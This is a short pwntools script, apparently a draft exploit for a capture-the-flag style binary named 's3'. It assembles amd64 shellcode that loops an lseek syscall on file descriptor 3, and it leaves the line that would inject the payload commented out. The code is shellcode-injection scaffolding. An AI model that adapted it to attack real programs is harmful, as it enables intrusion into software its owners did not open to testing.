from pwn import *
conn=process("./s3")
sh="""start:
    push 3
    pop rdi
    xor edx, edx
    push 0x60
    pop rsi
    push SYS_lseek
    pop rax
    syscall
	jmp start"""
payload=asm(sh, arch="amd64")
conn.sendline(b"3")
print(payload)
#gdb.attach(conn)
#pause()
#conn.sendline(payload)
conn.interactive()
